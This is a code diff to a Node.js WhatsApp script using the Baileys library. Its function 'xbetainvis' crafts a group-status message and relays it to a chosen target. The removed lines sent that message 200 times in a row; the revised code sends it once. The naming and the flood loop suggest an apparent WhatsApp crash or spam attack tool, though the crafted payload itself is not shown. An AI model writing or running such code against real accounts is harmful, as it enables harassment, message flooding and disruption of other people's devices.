@@ -26,7 +26,7 @@
 
 const { default: makeWASocket, useMultiFileAuthState, Browsers, delay, DisconnectReason, makeCacheableSignalKeyStore, generateWAMessageFromContent, getUSyncDevices, jidDecode, encodeWAMessage, encodeSignedDeviceIdentity } = require('@whiskeysockets/baileys');
 const pino = require('pino');
-const crypto = require('crypto')
+const crypto = require('crypto');
 
 async function xbetainvis(SYxS7, target) {
     const msg = generateWAMessageFromContent(target, {
@@ -56,30 +56,16 @@ async function xbetainvis(SYxS7, target) {
         additionalAttributes: { edit: "7" }
     });
 
-    const ms = 3;
-    const total = 200;
-
-    for (let i = 0; i < total; i++) {
-        try {
-            await SYxS7.relayMessage(target, {
-                groupStatusMessageV2: {
-                    message: msg.message
-                }
-            }, {
-                messageId: null
-            });
-
-            if (i < total - 1) {
-                await new Promise(resolve => setTimeout(resolve, ms * 1000));
+    try {
+        await SYxS7.relayMessage(target, {
+            groupStatusMessageV2: {
+                message: msg.message
             }
-
-        } catch (error) {
-            console.log(`[ 🗑️ ] Error on message ${i + 1}: ${error.message}`);
-
-            if (i < total - 1) {
-                await new Promise(resolve => setTimeout(resolve, ms * 1000));
-            }
-        }
+        }, {
+            messageId: null
+        });
+    } catch (error) {
+        console.log(`[ 🗑️ ] Error on message: ${error.message}`);
     }
 }
 
